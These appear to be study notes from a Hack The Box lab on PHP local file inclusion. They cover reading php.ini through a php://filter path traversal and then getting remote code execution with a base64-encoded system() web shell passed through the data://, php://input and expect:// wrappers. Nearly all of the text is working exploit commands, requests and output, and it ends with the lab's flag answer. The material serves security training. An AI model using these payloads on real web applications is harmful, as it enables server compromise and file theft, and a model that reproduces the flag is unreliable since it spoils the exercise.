# PHP Wrappers
## Data
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations. 

### Checking PHP Configurations
To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. 

```sh
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Grep for `allow_url_include` to see its value.

```sh
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

### Remote Code Execution
With `allow_url_include` enabled, we can proceed with our data wrapper attack. As mentioned earlier, the data wrapper can be used to include external data, including PHP code. We can also pass it base64 encoded strings with `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

```sh
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

## Input
Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the input wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the input wrapper also depends on the `allow_url_include` setting, as mentioned earlier.

```sh
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Expect
Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, `expect` is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can check whether it is configured to load on the back-end server just like we did with `allow_url_include` earlier, but we’d grep for `expect` instead:

```sh
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect

extension=expect
```

```sh
]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Questions
1. Try to gain RCE using one of the PHP wrappers and read the flag at / **Answer: HTB{d!$46l3_r3m0t3_url_!nclud3}**
   - First check if `allow_url_include` is on:
        ```
        GET /index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini HTTP/1.1
        ```
        Grab the base64 encoded content in the HTMK response, decode it and look for `allow_url_include`:
        ```
        $ cat b64 | base64 -d | grep allow_url_include
        allow_url_include = On
        ```
   - With `allow_url_include` enabled we can use the `data` wrapper attack:
        ```
        GET /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=ls+/ HTTP/1.1
        
        <SNIP>
        37809e2f8952f06139011994726d9ef1.txt
        <SNIP>
        ```
        ```
        GET /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt HTTP/1.1
        
        <SNIP>
        HTB{d!$46l3_r3m0t3_url_!nclud3}
        <SNIP>
        ```